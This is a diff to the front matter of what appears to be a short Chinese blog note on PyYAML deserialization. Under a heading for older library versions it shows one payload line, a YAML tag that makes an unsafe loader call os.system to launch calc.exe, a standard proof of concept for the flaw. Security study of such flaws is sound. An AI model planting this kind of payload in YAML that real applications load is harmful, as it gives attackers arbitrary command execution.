@@ -1,8 +1,9 @@
 ---
-title: "pyYaml反序列化"
+title: PyYaml反序列化
 pubDatetime: 2025-10-03T23:41:50.000+08:00
-description: "pyYaml反序列化"
-tags: ["python"]
+description: PyYaml反序列化
+tags:
+  - python
 ---
 ## 低版本
 ```!!python/object/apply:os.system ["calc.exe"]```
